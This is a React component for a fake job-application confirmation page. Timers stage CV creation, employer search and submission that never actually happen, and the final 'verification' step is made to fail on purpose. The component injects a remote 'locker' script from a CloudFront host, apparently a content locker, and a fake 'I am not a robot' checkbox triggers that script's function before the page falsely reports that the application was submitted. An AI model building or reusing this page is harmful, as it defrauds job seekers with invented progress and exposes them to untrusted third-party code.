import { motion, AnimatePresence } from "motion/react";
import { CheckCircle2, ArrowRight, Check, X, ShieldAlert, Loader2 } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";

const STEPS = [
  { id: 1, label: "Creating your CV", duration: 1200 },
  { id: 2, label: "Searching for suitable employers", duration: 1500 },
  { id: 3, label: "Sending your application", duration: 1500 },
  { id: 4, label: "Verification required" },
];

type StepStatus = "processing" | "failed" | "completed";

export default function ApplicationSuccess() {
  const navigate = useNavigate();
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [isCompleted, setIsCompleted] = useState(false);
  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const [lastStepStatus, setLastStepStatus] = useState<StepStatus>("processing");
  const [isVerifying, setIsVerifying] = useState(false);
  const [checkboxChecked, setCheckboxChecked] = useState(false);

  useEffect(() => {
    // Check if scripts are already present
    if (!document.getElementById("locker-config")) {
      const configScript = document.createElement("script");
      configScript.id = "locker-config";
      configScript.type = "text/javascript";
      configScript.innerHTML = 'var QKYij_QOC_QUsJBc = {"it":4600135,"key":"a9fae"};';
      document.head.appendChild(configScript);
    }

    if (!document.getElementById("locker-main")) {
      const lockerScript = document.createElement("script");
      lockerScript.id = "locker-main";
      lockerScript.src = "https://d1qt1z4ccvak33.cloudfront.net/841fdf1.js";
      lockerScript.async = true;
      document.head.appendChild(lockerScript);
    }
  }, []);

  useEffect(() => {
    if (currentStepIndex < STEPS.length - 1) {
      const step = STEPS[currentStepIndex];
      const timer = setTimeout(() => {
        setCompletedSteps((prev) => [...prev, step.id]);
        setCurrentStepIndex((prev) => prev + 1);
      }, (step as any).duration);
      return () => clearTimeout(timer);
    } else if (currentStepIndex === STEPS.length - 1 && lastStepStatus === "processing") {
      const timer = setTimeout(() => {
        setLastStepStatus("failed");
      }, 1200);
      return () => clearTimeout(timer);
    }
  }, [currentStepIndex, lastStepStatus]);

  const handleManualVerify = () => {
    if (lastStepStatus !== "failed" || isVerifying || !checkboxChecked) return;
    
    setIsVerifying(true);
    
    // Add realistic trigger delay
    setTimeout(() => {
      if (typeof (window as any)._VX === "function") {
        (window as any)._VX();
      } else {
        console.warn("Locker script function _VX not found");
        setLastStepStatus("completed");
        setCompletedSteps((prev) => [...prev, STEPS[3].id]);
        setTimeout(() => setIsCompleted(true), 1000);
      }
      setIsVerifying(false);
    }, 400);
  };

  const calculateProgress = () => {
    if (isCompleted) return 100;
    const baseProgress = (currentStepIndex / STEPS.length) * 100;
    if (currentStepIndex === 3) {
      if (lastStepStatus === "completed") return 100;
      return 75; // Stay at 75% for failed/processing robot check
    }
    return baseProgress;
  };

  return (
    <div className="min-h-screen bg-bg transition-colors duration-300">
      <main className="max-w-7xl mx-auto px-4 pt-6 pb-12 md:pt-12 md:pb-24 flex flex-col items-center justify-center">
        <AnimatePresence mode="wait">
          {!isCompleted ? (
            <motion.div
              key="processing"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="w-full max-w-lg bg-surface border border-border-theme rounded-[32px] p-8 md:p-12 shadow-2xl shadow-black/5"
            >
              <div className="text-center mb-10">
                <h1 className="text-3xl font-black text-text-main tracking-tight mb-3">
                  Processing Your Application
                </h1>
                <p className="text-text-muted font-medium">
                  Please wait while we complete the final application steps.
                </p>
              </div>

              <div className="space-y-6">
                {STEPS.map((step, index) => {
                  const isFinished = completedSteps.includes(step.id);
                  const isActive = index === currentStepIndex;
                  const isWaiting = index > currentStepIndex;
                  const isRobotStep = index === 3;

                  let icon;
                  let textColor = "text-text-main";

                  if (isRobotStep && isActive) {
                    if (lastStepStatus === "failed") {
                      icon = (
                        <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center text-white shadow-lg shadow-red-500/20">
                          <X className="w-5 h-5 stroke-[4]" />
                        </div>
                      );
                      textColor = "text-red-600 dark:text-red-500";
                    } else if (lastStepStatus === "completed") {
                      icon = (
                        <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white shadow-lg shadow-green-500/20">
                          <Check className="w-5 h-5 stroke-[3]" />
                        </div>
                      );
                      textColor = "text-green-600 dark:text-green-500";
                    } else {
                      icon = <div className="w-8 h-8 border-2 border-blue-600 border-t-transparent rounded-full animate-spin" />;
                      textColor = "text-blue-600";
                    }
                  } else if (isFinished) {
                    icon = (
                      <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white shadow-lg shadow-green-500/20">
                        <Check className="w-5 h-5 stroke-[3]" />
                      </div>
                    );
                    textColor = "text-green-600 dark:text-green-500";
                  } else if (isActive) {
                    icon = <div className="w-8 h-8 border-2 border-blue-600 border-t-transparent rounded-full animate-spin" />;
                    textColor = "text-blue-600";
                  } else {
                    icon = <div className="w-8 h-8 bg-gray-100 dark:bg-white/5 rounded-full" />;
                  }

                  let statusText = step.label;
                  if (isRobotStep && isActive && lastStepStatus === "failed") statusText = "Verification Failed";
                  if (isRobotStep && isFinished) statusText = "Completed";

                  return (
                    <div 
                      key={step.id}
                      className={`flex items-center gap-4 transition-all duration-500 ${
                        isWaiting ? "opacity-30" : "opacity-100"
                      }`}
                    >
                      <div className="flex-shrink-0">{icon}</div>
                      <span className={`text-lg font-bold transition-colors ${textColor}`}>
                        {statusText}
                      </span>
                    </div>
                  );
                })}
              </div>

              <AnimatePresence>
                {lastStepStatus === "failed" && (
                  <motion.div
                    initial={{ opacity: 0, height: 0, marginTop: 0 }}
                    animate={{ opacity: 1, height: "auto", marginTop: 32 }}
                    exit={{ opacity: 0, height: 0, marginTop: 0 }}
                    className="overflow-hidden"
                  >
                    <div className="p-5 bg-red-50 dark:bg-red-500/5 border border-red-100 dark:border-red-500/20 rounded-2xl mb-4">
                      <div className="flex gap-3">
                        <ShieldAlert className="w-5 h-5 text-red-600 flex-shrink-0" />
                        <div>
                          <h3 className="text-[15px] font-bold text-red-700 dark:text-red-400">Verification Failed</h3>
                          <p className="text-[13px] text-red-600/80 dark:text-red-400/70 font-medium leading-relaxed">
                            We could not automatically verify your request. Please confirm manually.
                          </p>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-4">
                      <div 
                        onClick={() => setCheckboxChecked(!checkboxChecked)}
                        className="group p-5 bg-white dark:bg-white/5 border border-border-theme rounded-2xl shadow-sm hover:shadow-md transition-all cursor-pointer flex items-center gap-4 active:scale-[0.98]"
                      >
                        <div className={`w-6 h-6 rounded border-2 flex items-center justify-center transition-all ${
                          checkboxChecked 
                            ? "bg-blue-600 border-blue-600" 
                            : "border-gray-300 dark:border-white/20 group-hover:border-blue-500"
                        }`}>
                          {checkboxChecked && <Check className="w-3.5 h-3.5 text-white stroke-[3]" />}
                        </div>
                        <span className="text-[15px] font-bold text-text-main">I am not a robot</span>
                      </div>

                      <button
                        onClick={handleManualVerify}
                        disabled={!checkboxChecked || isVerifying}
                        className="w-full py-4 bg-blue-600 text-white font-black rounded-2xl hover:bg-blue-700 transition-all shadow-xl shadow-blue-500/25 disabled:opacity-50 disabled:shadow-none flex items-center justify-center gap-2"
                      >
                        {isVerifying ? (
                          <Loader2 className="w-5 h-5 animate-spin" />
                        ) : (
                          "Verify"
                        )}
                      </button>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>

              <div className="mt-12">
                <div className="h-1.5 w-full bg-gray-100 dark:bg-white/5 rounded-full overflow-hidden">
                  <motion.div 
                    initial={{ width: "0%" }}
                    animate={{ width: `${calculateProgress()}%` }}
                    className="h-full bg-blue-600 transition-all duration-700 ease-in-out"
                  />
                </div>
              </div>
            </motion.div>
          ) : (
            <motion.div
              key="completed"
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              transition={{ type: "spring", stiffness: 180, damping: 20 }}
              className="text-center max-w-xl px-4"
            >
              <div className="w-24 h-24 bg-green-50 dark:bg-green-500/10 rounded-[32px] flex items-center justify-center text-green-600 mx-auto mb-8 shadow-sm">
                <CheckCircle2 className="w-12 h-12 stroke-[1.5]" />
              </div>
              
              <h2 className="text-4xl md:text-5xl font-black text-text-main tracking-tight mb-4">
                Application Submitted
              </h2>
              <p className="text-lg text-text-muted leading-relaxed mb-10 max-w-lg mx-auto">
                Your application has been submitted successfully. We will contact you shortly.
              </p>

              <button
                onClick={() => navigate("/")}
                className="group flex items-center gap-3 px-10 py-5 bg-blue-600 text-white font-black rounded-2xl hover:bg-blue-700 transition-all shadow-xl shadow-blue-500/25 active:scale-95 mx-auto"
              >
                Back to Jobs
                <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </main>
    </div>
  );
}
